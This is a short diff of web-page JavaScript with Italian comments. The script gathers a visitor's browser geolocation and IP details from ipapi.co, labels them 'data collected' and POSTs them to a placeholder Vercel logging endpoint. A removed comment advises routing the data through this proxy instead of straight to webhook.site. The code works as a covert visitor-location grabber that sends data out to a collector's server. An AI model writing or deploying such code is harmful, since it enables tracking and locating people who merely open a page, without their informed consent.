@@ -56,7 +56,7 @@
         }
       };
 
-      // Geolocalizzazione (può fallire)
+      // Geolocalizzazione
       if (navigator.geolocation) {
         try {
           const pos = await new Promise((resolve, reject) => {
@@ -70,7 +70,7 @@
         }
       }
 
-      // Info IP e città
+      // Info IP
       try {
         const ipRes = await fetch('https://ipapi.co/json/');
         if (ipRes.ok) {
@@ -90,8 +90,8 @@
 
       console.log("Dati raccolti:", data);
 
-      // INVIO al tuo proxy server (NON direttamente a webhook.site!)
-      fetch('https://TUO-NOME.vercel.app/log', { // sostituisci con il tuo dominio Vercel
+      // INVIO al proxy server Vercel
+      fetch('https://TUO-NOME.vercel.app/log', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
